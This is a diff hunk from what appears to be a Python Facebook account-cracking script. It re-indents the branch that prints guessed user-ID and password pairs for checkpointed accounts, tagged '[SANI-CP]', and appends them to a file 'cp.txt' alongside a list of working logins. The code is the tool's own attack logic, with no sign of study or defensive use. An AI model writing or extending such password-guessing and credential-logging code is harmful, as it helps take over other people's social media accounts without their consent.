@@ -457,11 +457,11 @@ def b_menu_select():
 		                                                        oks.append(uid + pass7)
 		                                                    else:
 		    	                                                if 'www.facebook.com' in d['error_msg']:
-		                                                        print("\t\x1b[1;93m[SANI-CP] "+uid+" | "+pass7+" | "+name)
-		                                                        cp=open("cp.txt","a")
-		                                                        cp.write(uid+" | "+pass7+"\n")
-		                                                        cp.close()
-		                                                        cps.append(uid + pass7)
+		                                                            print("\t\x1b[1;93m[SANI-CP] "+uid+" | "+pass7+" | "+name)
+		                                                            cp=open("cp.txt","a")
+		                                                            cp.write(uid+" | "+pass7+"\n")
+		                                                            cp.close()
+		                                                            cps.append(uid + pass7)
 															
 		except:
 			pass
